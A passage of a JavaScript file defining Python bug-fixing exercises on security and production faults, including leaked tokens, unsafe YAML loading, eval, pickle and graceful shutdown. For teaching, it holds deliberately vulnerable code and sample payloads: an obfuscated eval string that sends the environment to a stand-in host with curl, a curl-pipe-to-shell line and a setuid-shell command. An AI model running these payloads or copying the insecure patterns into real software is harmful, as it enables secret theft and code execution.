      real: ["python3 -m venv /tmp/y && /tmp/y/bin/pip install PyYAML==6.0.2 && /tmp/y/bin/pip show -f PyYAML | grep yaml/__init__"],
      sim(py) {
        const reqs = py.code.map((l) => l.trim()).filter(Boolean);
        const y = reqs.find((l) => /yaml/i.test(l));
        if (!y) return { out: lines("Successfully installed certifi-2024.8.30 charset-normalizer-3.4.0 idna-3.10 requests-2.32.3 urllib3-2.2.3", dim("---- python -c 'import yaml'"), err("Traceback (most recent call last):"), err('  File "<string>", line 1, in <module>'), err("ModuleNotFoundError: No module named 'yaml'")), exit: 1, ok: [true, false] };
        if (/^pyyaml\s*(==\s*[\d.]+)?$/i.test(y)) return { out: lines(`Successfully installed PyYAML-${(y.split("==")[1] || "6.0.3").trim()} certifi-2024.8.30 charset-normalizer-3.4.0 idna-3.10 requests-2.32.3 urllib3-2.2.3`), exit: 0, ok: [true, true] };
        return { out: [err(`ERROR: Could not find a version that satisfies the requirement ${y} (from versions: none)`), err(`ERROR: No matching distribution found for ${y}`)], exit: 1, ok: [false, false] };
      }
    });

    // --- Security ----------------------------------------------------------------------

    const entropy = (s) => { const n = {}; for (const ch of s) n[ch] = (n[ch] || 0) + 1; return -Object.values(n).reduce((a, c) => a + c / s.length * Math.log2(c / s.length), 0); };
    const logCalls = (py) => py.calls("print|(logging|log|logger)\\.(debug|info|warning|error|critical|exception)");

    S.push({
      id: "secretlog", group: "Security", level: "12", title: "Token printed in the CI log",
      file: "create_release.py", cmd: "LOG_LEVEL=DEBUG python3 create_release.py   # how the pipeline runs it",
      story: "The deploy token turned up in a public CI log. Debug logging had been switched on to chase a flaky step, and one debug line printed the request headers, Authorization included.",
      goal: "Keep the debug logging, but never write the token or the headers to the output.",
      checks: ["The token never appears in the output", "The release is still logged", "No log or print call includes the headers or the token"],
      code: src`
import logging
import os

import requests

logging.basicConfig(level=os.environ.get("LOG_LEVEL", "INFO"), format="%(levelname)s %(message)s")
log = logging.getLogger("release")

TOKEN = os.environ["DEPLOY_TOKEN"]
headers = {"Authorization": f"Bearer {TOKEN}"}

log.debug("POST /api/releases headers=%s", headers)
resp = requests.post("https://deploy.internal/api/releases", headers=headers, json={"version": "2.4.1"}, timeout=10)
resp.raise_for_status()
log.info("release %s created", resp.json()["id"])
`,
      fix: [["log.debug(\"POST /api/releases headers=%s\", headers)", "log.debug(\"POST /api/releases\")"]],
      wrong: [
        [["log.debug(\"POST /api/releases headers=%s\", headers)", "log.info(\"POST /api/releases headers=%s\", headers)"]],
        [["level=os.environ.get(\"LOG_LEVEL\", \"INFO\")", "level=\"INFO\""]]
      ],
      hints: [
        "Search the output for \"Bearer\". Which line put it there?",
        "Turning the log level down hides it today; the line is still there for the next person who turns debugging on. Do not log secrets at any level.",
        "Log what is useful without the headers: `log.debug(\"POST /api/releases\")`. Then rotate the token, because it has already leaked."
      ],
      lesson: "Never log credentials, at any level: not headers, URLs with tokens, or whole config objects. Log what happened, not what was sent, and rotate anything that leaked.",
      real: ["LOG_LEVEL=DEBUG DEPLOY_TOKEN=test-only python3 create_release.py 2>&1 | grep -c test-only"],
      sim(py) {
        if (!py.call("requests\\.post")) return gone("it no longer creates the release");
        const lvl = at(py, /basicConfig\(/);
        const debug = /LOG_LEVEL/.test(lvl) || /DEBUG/.test(lvl);
        const leaky = logCalls(py).filter((c) => /\b(headers|TOKEN|token)\b/.test(c.args) && !/\[\s*:\s*\d+\s*\]|mask|redact|\*\*\*/.test(c.args));
        const shown = leaky.filter((c) => !/\.debug$/.test(c.name) || debug);
        const out = [...(debug ? lines("DEBUG Starting new HTTPS connection (1): deploy.internal:443", "DEBUG https://deploy.internal:443 \"POST /api/releases HTTP/1.1\" 201 54") : [])];
        const leakLine = "{'Authorization': 'Bearer dpl_7f3a9c21e84b06d5'}";
        if (shown.length) out.unshift([`${/\.debug$/.test(shown[0].name) ? "DEBUG" : "INFO"} POST /api/releases headers=${leakLine}`, "err"]);
        else if (debug && py.has(/log\.debug\(\s*["']POST/)) out.unshift(["DEBUG POST /api/releases", ""]);
        const released = py.has(/\.info\(\s*["']release/);
        if (released) out.push(["INFO release rel-2041 created", ""]);
        return { out, exit: 0, ok: [!shown.length, released, !leaky.length] };
      }
    });

    S.push({
      id: "hardcoded", group: "Security", level: "12", title: "A key committed to the repository",
      file: "page_oncall.py", cmd: "python3 scripts/secret_scanner.py page_oncall.py   # the CI gate, then the script itself",
      story: "The secret scanner in CI blocks the merge: the paging script has its API key written into the source. The author wants to merge today.",
      goal: "Read the key from the ONCALL_API_KEY environment variable so no credential is left in the code.",
      checks: ["The secret scanner passes", "No credential left in the source", "The key is read from the environment"],
      code: src`
import requests

API_KEY = "pd_live_EXAMPLE4f9c2a81d7e6b3"


def page(summary):
    resp = requests.post("https://alerts.internal/v2/enqueue", json={
        "routing_key": API_KEY, "event_action": "trigger",
        "payload": {"summary": summary, "source": "ops-01", "severity": "critical"},
    }, timeout=10)
    resp.raise_for_status()


if __name__ == "__main__":
    page("disk full on db-01")
`,
      fix: [["import requests\n", "import os\n\nimport requests\n"], ["API_KEY = \"pd_live_EXAMPLE4f9c2a81d7e6b3\"", "API_KEY = os.environ[\"ONCALL_API_KEY\"]"]],
      wrong: [
        [["import requests\n", "import base64\n\nimport requests\n"], ["API_KEY = \"pd_live_EXAMPLE4f9c2a81d7e6b3\"", "API_KEY = base64.b64decode(\"cGRfbGl2ZV9FWEFNUExFNGY5YzJhODFkN2U2YjM=\").decode()"]],
        [["API_KEY = \"pd_live_EXAMPLE4f9c2a81d7e6b3\"", "API_KEY = \"pd_live_\" + \"EXAMPLE4f9c2a81d7e6b3\""]]
      ],
      hints: [
        "Anything in the repository is readable by everyone who can clone it, now and in every old commit.",
        "Encoding or splitting the key fools the scanner, not an attacker: base64 decodes in one command.",
        "Read it at run time: `API_KEY = os.environ[\"ONCALL_API_KEY\"]` (import os), set it from the CI or server's secret store, and rotate the old key."
      ],
      lesson: "Credentials come from the environment or a secret store at run time, never from the source. A key that was committed is compromised: rotate it, as history keeps it.",
      real: ["python3 scripts/secret_scanner.py page_oncall.py; echo \"exit $?\""],
      sim(py) {
        const n = py.line(/^\s*API_KEY\s*=/);
        if (!n || !py.call("requests\\.post")) return gone("it no longer sends the page with API_KEY");
        const s = py.stmt(n);
        const env = /os\.environ|os\.getenv|getpass|keyring|open\(/.test(s);
        const lit = (/["']([^"'\s]{8,})["']/.exec(s) || [])[1];
        const direct = /^\s*API_KEY\s*=\s*["']([^"'\s]{8,})["']/.exec(s);
        const flagged = direct && entropy(direct[1]) >= 3;
        const scan = flagged ? lines(`page_oncall.py:${n}: Password assignment (${direct[1].slice(0, 4)}…${direct[1].slice(-2)})`, "1 possible secret(s) found.") : lines("No secrets found.");
        const left = Boolean(lit) && !env;
        return { out: scan.map(([t]) => [t, flagged ? "err" : ""]), exit: flagged ? 1 : 0, ok: [!flagged, !left, env] };
      }
    });

    S.push({
      id: "yamlunsafe", group: "Security", level: "12", title: "yaml.load runs code",
      file: "apply_steps.py", cmd: "python3 apply_steps.py   # with deploy.yml from main, then from pull request #482",
      story: "After a PyYAML upgrade the deploy runner failed with a TypeError, and the quick fix suggested in a forum was Loader=yaml.Loader. Pull request #482, from a fork, changes deploy.yml.",
      goal: "Load deploy.yml as plain data: the normal file deploys, and the tag in pull request #482 is rejected instead of run.",
      checks: ["Loads the normal deploy.yml", "The pull request's payload never runs"],
      code: src`
import subprocess

import yaml

with open("deploy.yml", encoding="utf-8") as f:
    spec = yaml.load(f)

for step in spec["steps"]:
    subprocess.run(["kubectl", "apply", "-f", step["manifest"]], check=True)
`,
      fix: [["yaml.load(f)", "yaml.safe_load(f)"]],
      wrong: [
        [["yaml.load(f)", "yaml.load(f, Loader=yaml.Loader)"]],
        [["yaml.load(f)", "yaml.unsafe_load(f)"]]
      ],
      hints: [
        "PyYAML 6 makes you choose a Loader on purpose. Look at what pull request #482's file contains: a !!python/object/apply tag.",
        "yaml.Loader and unsafe_load build any Python object a file asks for, including a call to os.system.",
        "Use `yaml.safe_load(f)`: only plain data (maps, lists, strings, numbers); unknown tags raise ConstructorError."
      ],
      lesson: "Use yaml.safe_load for any file you did not write yourself. The full loaders can construct arbitrary Python objects, which is code execution.",
      real: ["printf 'a: !!python/object/apply:os.getcwd []\\n' > t.yml", "python3 -c \"import yaml; print(yaml.safe_load(open('t.yml')))\""],
      sim(py) {
        const c = py.call("yaml\\.(load|safe_load|unsafe_load|full_load|load_all|safe_load_all)");
        if (!c || !py.has(/kubectl/)) return gone("it no longer loads deploy.yml and applies the steps");
        const L = c.kw.Loader || c.pos[1] || "";
        const safe = /^yaml\.(safe_load|full_load|safe_load_all)$/.test(c.name) || /SafeLoader|CSafeLoader|FullLoader|BaseLoader/.test(L);
        const unsafe = /unsafe_load/.test(c.name) || /\b(Loader|UnsafeLoader|CLoader|CUnsafeLoader)\b/.test(L) && !safe;
        const main = lines("deployment.apps/web configured", "service/web unchanged");
        const pr = dim("---- deploy.yml from pull request #482");
        if (safe) return { out: [...main, pr, ...traceback(py, "apply_steps.py", c.line, [vlib("yaml/__init__.py", 125, "safe_load", "return load(stream, SafeLoader)"), vlib("yaml/__init__.py", 81, "load", "return loader.get_single_data()"), vlib("yaml/constructor.py", 427, "construct_undefined", "raise ConstructorError(None, None,\n        \"could not determine a constructor for the tag %r\" % node.tag,\n        node.start_mark)")],
          "yaml.constructor.ConstructorError: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply:os.system'\n  in \"deploy.yml\", line 3, column 15")], exit: 1, ok: [true, true] };
        if (unsafe) {
          const r = py.line(/subprocess\.run\(/);
          return { out: [...main, pr, err("(os.system ran while loading: curl -s http://203.0.113.9/k | sh)"), ["deployment.apps/web configured", ""], ...traceback(py, "apply_steps.py", r, [lib("subprocess.py", 555, "run", "with Popen(*popenargs, **kwargs) as process:"), lib("subprocess.py", 1821, "_posix_spawn", "self.pid = os.posix_spawn(executable, args, env, **kwargs)")], "TypeError: expected str, bytes or os.PathLike object, not int")], exit: 1, ok: [true, false] };
        }
        return { out: traceback(py, "apply_steps.py", c.line, null, "TypeError: load() missing 1 required positional argument: 'Loader'"), exit: 1, ok: [false, true] };
      }
    });

    const PAYLOAD = "__builtins__.__dict__['__imp'+'ort__']('os').system('env | curl -s -d @- http://203.0.113.9/')";
    S.push({
      id: "evalinput", group: "Security", level: "12", title: "eval on a setting",
      file: "job_settings.py", cmd: "python3 job_settings.py   # with normal settings, then with TIMEOUT changed in the CI settings page",
      story: "The job reads its numeric settings with eval. Anyone who can edit CI variables can change TIMEOUT, and someone set it to a line of Python that sent the job's environment, secrets included, to their server.",
      goal: "Read MAX_RETRIES as an int and TIMEOUT as a float, so a setting can never run code.",
      checks: ["Reads normal values (3 and 10)", "The TIMEOUT payload never runs"],
      code: src`
import os

MAX_RETRIES = eval(os.environ.get("MAX_RETRIES", "3"))
TIMEOUT = eval(os.environ.get("TIMEOUT", "10"))
print(f"retries={MAX_RETRIES} timeout={TIMEOUT}s")
`,
      fix: [["eval(os.environ.get(\"MAX_RETRIES\", \"3\"))", "int(os.environ.get(\"MAX_RETRIES\", \"3\"))"], ["eval(os.environ.get(\"TIMEOUT\", \"10\"))", "float(os.environ.get(\"TIMEOUT\", \"10\"))"]],
      wrong: [
        [["TIMEOUT = eval(os.environ.get(\"TIMEOUT\", \"10\"))", "value = os.environ.get(\"TIMEOUT\", \"10\")\nif \"import\" in value:\n    raise ValueError(\"bad TIMEOUT\")\nTIMEOUT = eval(value)"]],
        [["TIMEOUT = eval(os.environ.get(\"TIMEOUT\", \"10\"))", "try:\n    TIMEOUT = eval(os.environ.get(\"TIMEOUT\", \"10\"))\nexcept Exception:\n    TIMEOUT = 10"]]
      ],
      hints: [
        "eval runs whatever Python the string contains. Who can set these environment variables?",
        "Blocklists lose: the payload already spells import as '__imp' + 'ort__'. Catching errors does not help either, because the payload runs without one.",
        "Convert, do not evaluate: `int(os.environ.get(\"MAX_RETRIES\", \"3\"))` and `float(os.environ.get(\"TIMEOUT\", \"10\"))`."
      ],
      lesson: "Never eval or exec data. Parse it with int(), float(), json.loads() or ast.literal_eval(), which accept values and reject code.",
      real: ["TIMEOUT='__import__(\"os\").getcwd()' python3 job_settings.py   # the eval version prints a directory, not a number"],
      sim(py) {
        const get = (name) => at(py, new RegExp(`^\\s*${name}\\s*=`));
        const t = get("TIMEOUT"), m = get("MAX_RETRIES");
        if (!t || !m) return gone("it no longer reads both settings");
        const evals = (s) => /\beval\(|\bexec\(/.test(s) || (/\b(eval|exec)\(\s*value/.test(py.text) && /\bvalue\b/.test(s));
        const tEval = evals(t) || py.has(/\b(eval|exec)\(/) && /value/.test(t);
        const n = py.line(/^\s*TIMEOUT\s*=/);
        const normal = lines("retries=3 timeout=10s");
        const attacked = dim("---- TIMEOUT changed in the CI settings");
        if (!tEval && !evals(m)) {
          const lit = /literal_eval/.test(t);
          return { out: [...normal, attacked, ...traceback(py, "job_settings.py", n, lit ? [lib("ast.py", 112, "literal_eval", "return _convert(node_or_string)"), lib("ast.py", 111, "_convert", "return _convert_signed_num(node)"), lib("ast.py", 85, "_convert_signed_num", "return _convert_num(node)"), lib("ast.py", 76, "_convert_num", "_raise_malformed_node(node)"), lib("ast.py", 73, "_raise_malformed_node", "raise ValueError(msg + f': {node!r}')")] : null,
            lit ? "ValueError: malformed node or string on line 1: <ast.Call object at 0x7f3a1c2b5e50>" : /int\(/.test(t) ? `ValueError: invalid literal for int() with base 10: "${PAYLOAD}"` : `ValueError: could not convert string to float: "${PAYLOAD}"`)], exit: 1, ok: [true, true] };
        }
        return { out: [...normal, attacked, err("(the payload ran: env | curl -s -d @- http://203.0.113.9/; the job's secrets left the runner)"), ["retries=3 timeout=0s", ""]], exit: 0, ok: [true, false] };
      }
    });

    S.push({
      id: "pickle", group: "Security", level: "12", title: "Unpickling a shared cache",
      file: "inventory_cache.py", cmd: "python3 inventory_cache.py   # from root's crontab",
      story: "A root cron job caches the host inventory in /tmp with pickle. Any user on the box can write to /tmp, and unpickling a file runs whatever code its author put in it.",
      goal: "Cache the inventory in a format that cannot run code, in a directory only the job's own user can write.",
      checks: ["The cache format cannot run code", "The cache is not in a directory other users can write"],
      code: src`
import json
import os
import pickle
import time
import urllib.request

CACHE = "/tmp/inventory.cache"
URL = "https://cmdb.internal/api/hosts"


def fetch_inventory():
    with urllib.request.urlopen(URL, timeout=10) as resp:
        return json.load(resp)


def load_inventory():
    if os.path.exists(CACHE) and time.time() - os.path.getmtime(CACHE) < 3600:
        with open(CACHE, "rb") as f:
            return pickle.load(f)
    inventory = fetch_inventory()
    with open(CACHE, "wb") as f:
        pickle.dump(inventory, f)
    return inventory


print(len(load_inventory()), "hosts")
`,
      fix: [["CACHE = \"/tmp/inventory.cache\"", "CACHE = os.path.expanduser(\"~/.cache/inventory.json\")"],
        ["        with open(CACHE, \"rb\") as f:\n            return pickle.load(f)", "        with open(CACHE, encoding=\"utf-8\") as f:\n            return json.load(f)"],
        ["    with open(CACHE, \"wb\") as f:\n        pickle.dump(inventory, f)", "    with open(CACHE, \"w\", encoding=\"utf-8\") as f:\n        json.dump(inventory, f)"]],
      wrong: [
        [["        with open(CACHE, \"rb\") as f:\n            return pickle.load(f)", "        with open(CACHE, encoding=\"utf-8\") as f:\n            return json.load(f)"],
          ["    with open(CACHE, \"wb\") as f:\n        pickle.dump(inventory, f)", "    with open(CACHE, \"w\", encoding=\"utf-8\") as f:\n        json.dump(inventory, f)"]],
        [["        pickle.dump(inventory, f)", "        pickle.dump(inventory, f)\n    os.chmod(CACHE, 0o600)"]]
      ],
      hints: [
        "pickle.load can call any function the file names. Who else can create /tmp/inventory.cache before this job does?",
        "chmod after writing is too late: another user can create the file first, and it stays theirs. JSON in /tmp can still be swapped for a fake inventory.",
        "Store JSON (json.dump / json.load) in a directory only this user can write, for example `os.path.expanduser(\"~/.cache/inventory.json\")`."
      ],
      lesson: "Only unpickle data you created and nobody else could change. For caches and exchange use JSON, and keep files a privileged job trusts out of shared directories like /tmp.",
      real: ["python3 -c \"import pickle, os; print(pickle.loads(pickle.dumps(os.getcwd)))\"   # pickles can name any callable"],
      sim(py) {
        const def = at(py, /^\s*CACHE\s*=/);
        if (!def || !py.has(/load_inventory\(/)) return gone("it no longer caches the inventory");
        const unsafe = py.has(/pickle\.loads?\(|marshal\.loads?\(|shelve\.open\(/);
        const shared = /["']\/(tmp|var\/tmp|dev\/shm)\//.test(def) || /gettempdir\(\)/.test(def);
        const out = [];
        if (unsafe && shared) out.push(err("(another user created /tmp/inventory.cache first; unpickling it as root ran: cp /bin/bash /tmp/.x && chmod u+s /tmp/.x)"));
        else if (unsafe) out.push(dim("(the cache is private, but pickle still runs whatever is in it if that file is ever replaced)"));
        else if (shared) out.push(err("(another user replaced /tmp/inventory.cache; the inventory now points db-01 at their server)"));
        out.push(["212 hosts", ""]);
        return { out, exit: 0, ok: [!unsafe, !shared] };
      }
    });

    // --- Production --------------------------------------------------------------------

    S.push({
      id: "cache", group: "Production", level: "13", title: "Memory grows until the OOM killer",
      file: "enrich.py", cmd: "tail -F /var/log/nginx/access.log | python3 enrich.py   # a long-running service",
      story: "The log enricher adds the owning team to every request. It was cached so the IP address service would survive the traffic, and now the enricher itself is OOM-killed every four days: every IP on the internet ends up in the cache.",
      goal: "Keep memory bounded and keep the IP service under 2,000 requests per second. The traffic is 18,000 lines per second; most come from a few hundred thousand addresses.",
      checks: ["Memory stays bounded", "The IP service gets under 2,000 requests per second"],
      code: src`
import functools
import sys

import requests


@functools.lru_cache(maxsize=None)
def owner_of(ip):
    resp = requests.get(f"https://ipam.internal/api/owner/{ip}", timeout=5)
    resp.raise_for_status()
    return resp.json()["team"]


for line in sys.stdin:
    ip = line.split(" ", 1)[0]
    print(owner_of(ip), line, end="")
`,
      fix: [["maxsize=None", "maxsize=200_000"]],
      wrong: [
        [["@functools.lru_cache(maxsize=None)", "@functools.cache"]],
        [["@functools.lru_cache(maxsize=None)\n", ""]],
        [["@functools.lru_cache(maxsize=None)", "@functools.lru_cache"]]
      ],
      hints: [
        "maxsize=None means the cache never forgets anything. How many distinct client IPs does a public site see in four days?",
        "Removing the cache sends all 18,000 lookups a second to the IP service; the default maxsize of 128 is far too small to help.",
        "Bound it at a size that holds the busy addresses: `@functools.lru_cache(maxsize=200_000)` (about 280 MB), and watch the hit rate with `owner_of.cache_info()`."
      ],
      lesson: "Every cache in a long-running process needs a bound (and often an expiry). Size it from the working set, and measure hits and memory instead of guessing.",
      real: ["python3 -c \"import functools\n@functools.lru_cache(maxsize=2)\ndef f(x): return x\nfor i in (1, 2, 1, 3, 1): f(i)\nprint(f.cache_info())\""],
      sim(py) {
        const def = py.line(/^\s*def\s+owner_of\s*\(/);
        if (!def || !py.has(/owner_of\(\s*ip\s*\)/)) return gone("it no longer looks up the owner of each IP");
        const deco = py.code.slice(0, def - 1).reverse().filter((l) => l.trim()).slice(0, 3).filter((l) => /^\s*@/.test(l)).join(" ");
        let size = null;
        if (/functools\.cache\b|@cache\b|maxsize\s*=\s*None|lru_cache\(\s*None\s*\)/.test(deco)) size = Infinity;
        else if (/lru_cache\s*\(\s*(maxsize\s*=\s*)?([\d_]+)/.test(deco)) size = Number(/lru_cache\s*\(\s*(maxsize\s*=\s*)?([\d_]+)/.exec(deco)[2].replace(/_/g, ""));
        else if (/lru_cache/.test(deco)) size = 128;
        const sample = lines("payments 203.0.113.7 - - [30/Oct/2026:14:02:11 +0000] \"GET /api/cart HTTP/1.1\" 200 512", dim("(18,000 lines a second)"));
        if (size === Infinity) return { out: [...sample, dim("---- after 4 days"), dim("memory: 1.1 GB on day 1, 2.3 GB on day 2, 3.4 GB on day 3"), ["Killed", "err"]], exit: 137, ok: [false, true] };
        const hit = size == null ? 0 : size >= 100000 ? 0.94 : size >= 1000 ? 0.8 : 0.4;
        const rps = Math.round(18000 * (1 - hit));
        const mem = size == null ? 40 : Math.round(40 + Math.min(size, 400000) * 0.0012);
        return { out: [...sample, dim(`---- after 4 days: memory flat at ${mem} MB; ${Math.round(hit * 100)}% cache hits; the IP service gets ${rps.toLocaleString("en")} requests a second${rps >= 2000 ? " and rate-limits us (429)" : ""}`)], exit: 0, ok: [true, rps < 2000] };
      }
    });

    S.push({
      id: "distutils", group: "Production", level: "13", title: "No module named 'distutils'",
      file: "check_versions.py", cmd: "python3 check_versions.py 1.10.2 1.8.9 2.0.0   # after the server upgrade to Python 3.13",
      story: "The OS upgrade brought Python 3.13, and the pre-flight version check stopped working: distutils was removed from the standard library in Python 3.12. The venv has only the standard library.",
      goal: "Compare versions without distutils, so 1.10.2 and 2.0.0 pass and 1.8.9 is too old.",
      checks: ["Runs on Python 3.12 and later", "1.10.2 counts as newer than 1.9.0"],
      code: src`
import sys
from distutils.version import LooseVersion

MINIMUM = "1.9.0"


def new_enough(version):
    return LooseVersion(version) >= LooseVersion(MINIMUM)


for v in sys.argv[1:]:
    print(v, "ok" if new_enough(v) else "too old")
`,
      fix: [["from distutils.version import LooseVersion\n", ""], ["    return LooseVersion(version) >= LooseVersion(MINIMUM)", "    return tuple(map(int, version.split(\".\"))) >= tuple(map(int, MINIMUM.split(\".\")))"]],
      wrong: [
        [["from distutils.version import LooseVersion\n", ""], ["    return LooseVersion(version) >= LooseVersion(MINIMUM)", "    return version >= MINIMUM"]],
        [["from distutils.version import LooseVersion", "from setuptools._distutils.version import LooseVersion"]]
      ],
      hints: [
        "distutils was deprecated in 3.10 and removed in 3.12 (PEP 632). Upgrades that skip the deprecation warnings break here.",
        "Comparing the strings is not the same: \"1.10.2\" sorts before \"1.9.0\" character by character. setuptools is not in this venv either.",
        "Compare tuples of integers: `tuple(map(int, version.split(\".\"))) >= tuple(map(int, MINIMUM.split(\".\")))`, and remove the import."
      ],
      lesson: "Read the deprecation warnings before an upgrade: removed modules (distutils, imp, asynchat, cgi...) fail at import. Compare versions as numbers, or with packaging.version where you can install it.",
      real: ["python3 -W error::DeprecationWarning check_versions.py 1.10.2   # shows deprecations before they become errors", "python3 -c 'print(\"1.10.2\" >= \"1.9.0\")'"],
      sim(py) {
        const fn = py.line(/^\s*def\s+new_enough\s*\(/);
        if (!fn || !py.has(/new_enough\(/)) return gone("it no longer compares the versions");
        const imp = py.line(/^\s*(from|import)\s+(distutils|setuptools|packaging)\b/);
        if (imp) {
          const mod = (/^\s*(?:from|import)\s+(\w+)/.exec(py.code[imp - 1]) || [])[1];
          return { out: traceback(py, "check_versions.py", imp, null, `ModuleNotFoundError: No module named '${mod}'`), exit: 1, ok: [false, false] };
        }
        const body = py.bodyText(fn);
        const numeric = /int\b/.test(body) && /split\(/.test(body);
        return { out: numeric ? lines("1.10.2 ok", "1.8.9 too old", "2.0.0 ok") : lines("1.10.2 too old", "1.8.9 too old", "2.0.0 ok"), exit: 0, ok: [true, numeric] };
      }
    });

    S.push({
      id: "sigterm", group: "Production", level: "13", title: "Killed mid-job on every deploy",
      file: "worker.py", cmd: "python3 worker.py   # in a Kubernetes Pod; a rollout sends SIGTERM, then SIGKILL after 30 s",
      story: "Every deploy of the order worker sends some customers two confirmation emails. Kubernetes stops the old Pod with SIGTERM, Python dies at once by default, and the job it was half-way through runs again on the new Pod.",
      goal: "On SIGTERM, finish the current job, then exit 0 within the 30-second grace period.",
      checks: ["Finishes the current job before exiting", "Exits 0 within the grace period"],
      code: src`
import json
import time
from pathlib import Path

QUEUE = Path("/srv/queue")
DONE = Path("/srv/done")


def process(job):
    time.sleep(20)  # render the invoice, send the email
    return {"id": job.stem, "status": "sent"}


while True:
    for job in sorted(QUEUE.glob("*.json")):
        print(f"processing {job.name}", flush=True)
        result = process(job)
        (DONE / job.name).write_text(json.dumps(result))
        job.unlink()
    time.sleep(5)
`,
      fix: [["import json\n", "import json\nimport signal\n"],
        ["while True:\n    for job in sorted(QUEUE.glob(\"*.json\")):\n", "stopping = False\n\n\ndef stop(signum, frame):\n    global stopping\n    stopping = True\n\n\nsignal.signal(signal.SIGTERM, stop)\n\nwhile not stopping:\n    for job in sorted(QUEUE.glob(\"*.json\")):\n        if stopping:\n            break\n"]],
      wrong: [
        [["import json\n", "import json\nimport signal\n"], ["while True:\n", "signal.signal(signal.SIGTERM, signal.SIG_IGN)\n\nwhile True:\n"]],
        [["import json\n", "import json\nimport signal\nimport sys\n"], ["while True:\n", "signal.signal(signal.SIGTERM, lambda signum, frame: sys.exit(0))\n\nwhile True:\n"]]
      ],
      hints: [
        "Python's default reaction to SIGTERM is to stop immediately: no finally blocks, no cleanup, the job half done.",
        "Ignoring SIGTERM just means SIGKILL 30 seconds later, still mid-job. Exiting from the handler interrupts the job too.",
        "Install a handler that only sets a flag (`signal.signal(signal.SIGTERM, stop)`), and check the flag between jobs: `while not stopping:` and `if stopping: break`."
      ],
      lesson: "Services must shut down gracefully: catch SIGTERM, stop taking new work, finish or hand back the current item, and exit before the grace period ends.",
      real: ["python3 worker.py & sleep 2; kill -TERM %1; wait %1; echo \"exit $?\""],
      sim(py) {
        if (!py.line(/process\(\s*job\s*\)/)) return gone("it no longer processes the jobs");
        const start = lines("processing order-1841.json");
        const c = py.call("signal\\.signal");
        const twice = dim("(the new Pod picks up order-1841.json again: the customer gets a second email)");
        if (!c || !/SIGTERM/.test(c.pos[0] || "")) return { out: [...start, ["Terminated", ""], twice], exit: 143, ok: [false, false] };
        const h = c.pos.slice(1).join(",").trim();
        if (/SIG_IGN/.test(h)) return { out: [...start, dim("(SIGTERM ignored; 30 s later the kubelet sends SIGKILL)"), ["Killed", ""], twice], exit: 137, ok: [false, false] };
        const fnBody = /^lambda/.test(h) ? h : (() => { const d = py.line(new RegExp(`^\\s*def\\s+${h}\\s*\\(`)); return d ? py.bodyText(d) : ""; })();
        if (/sys\.exit|raise|os\._exit|exit\(/.test(fnBody)) return { out: [...start, twice], exit: 0, ok: [false, true] };
        const flag = (/global\s+(\w+)/.exec(fnBody) || /(\w+)\s*=\s*True/.exec(fnBody) || [])[1];
        const checked = flag && new RegExp(`while\\s+not\\s+${flag}\\b|if\\s+${flag}\\s*:`).test(py.text);
        if (!checked) return { out: [...start, dim("(the handler runs, but the loop never looks at it; SIGKILL after 30 s)"), ["Killed", ""], twice], exit: 137, ok: [false, false] };
        return { out: [...start, dim("(SIGTERM received; finishing order-1841.json)"), dim("(exited after 14 s; order-1842.json stays in the queue for the new Pod)")], exit: 0, ok: [true, true] };
      }
    });

    S.push({
      id: "atomic", group: "Production", level: "13", title: "Readers see a half-written file",
      file: "publish_flags.py", cmd: "python3 publish_flags.py   # the shop re-reads /etc/shop/flags.json every second",
      story: "Each time feature flags are published, checkout fails for a moment with HTTP 500. The shop re-reads the flags file every second, and sometimes reads it after open() emptied it and before json.dump finished.",
      goal: "Replace the flags file in one step, so readers see either the old file or the new one, never a partial one.",
      checks: ["Readers never see a half-written file", "The new flags are published"],
      code: src`
import json

FLAGS = "/etc/shop/flags.json"


def publish(flags):
    with open(FLAGS, "w", encoding="utf-8") as f:
        json.dump(flags, f, indent=2)


publish({"new_checkout": True, "dark_mode": False, "max_basket": 50})
`,
      fix: [["import json\n", "import json\nimport os\n"],
        ["    with open(FLAGS, \"w\", encoding=\"utf-8\") as f:\n        json.dump(flags, f, indent=2)\n", "    tmp = FLAGS + \".tmp\"\n    with open(tmp, \"w\", encoding=\"utf-8\") as f:\n        json.dump(flags, f, indent=2)\n    os.replace(tmp, FLAGS)\n"]],
      wrong: [
        [["import json\n", "import json\nimport os\n"],
          ["    with open(FLAGS, \"w\", encoding=\"utf-8\") as f:\n        json.dump(flags, f, indent=2)\n", "    with open(\"/tmp/flags.json\", \"w\", encoding=\"utf-8\") as f:\n        json.dump(flags, f, indent=2)\n    os.replace(\"/tmp/flags.json\", FLAGS)\n"]],
        [["        json.dump(flags, f, indent=2)\n", "        json.dump(flags, f, indent=2)\n        f.flush()\n"]]
      ],
      hints: [
        "open(..., \"w\") empties the file at once; the new content arrives a moment later. A reader in between gets nothing, or half.",
        "Renaming a file over another is atomic on POSIX, but only within one file system: /tmp is often a different one, and rename fails across devices.",
        "Write to a temporary file next to the target (`FLAGS + \".tmp\"`), then `os.replace(tmp, FLAGS)`."
      ],
      lesson: "Replace files atomically: write a temporary file in the same directory, then os.replace() it over the old one. Readers see the old or the new file, never a partial one.",
      real: ["python3 -c \"import os; open('a.tmp', 'w').write('{}'); os.replace('a.tmp', 'a.json'); print(open('a.json').read())\""],
      sim(py) {
        if (!py.line(/json\.dump\(/)) return gone("it no longer writes the flags");
        const rep = py.call("os\\.(replace|rename)");
        const reader = dim("---- the shop, reading flags.json every second");
        const ok = lines("14:02:11 reloaded flags: new_checkout=True dark_mode=False max_basket=50");
        if (!rep) return { out: [reader, err("14:02:11 flags.json: json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)"), err("14:02:11 checkout returned 500 to 212 requests"), ...ok], exit: 0, ok: [false, true] };
        const src = (rep.pos[0] || "").trim();
        const tmpVar = /^\w+$/.test(src) ? at(py, new RegExp(`^\\s*(\\w+\\s*,\\s*)?${src}\\s*=`)) : src;
        const elsewhere = /["']\/(tmp|var\/tmp|dev\/shm)\//.test(tmpVar) || (/mkstemp\(|NamedTemporaryFile\(/.test(tmpVar) && !/dir\s*=/.test(tmpVar));
        if (elsewhere) {
          const shown = (/["']([^"']+)["']/.exec(tmpVar) || [])[1] || "/tmp/tmpk3x9d2lq.tmp";
          return { out: traceback(py, "publish_flags.py", rep.line, null, `OSError: [Errno 18] Invalid cross-device link: '${shown}' -> '/etc/shop/flags.json'`), exit: 1, ok: [true, false] };
        }
        return { out: [reader, ...ok], exit: 0, ok: [true, true] };
      }
    });

    return S;
  };
})(typeof window !== "undefined" ? window : globalThis);
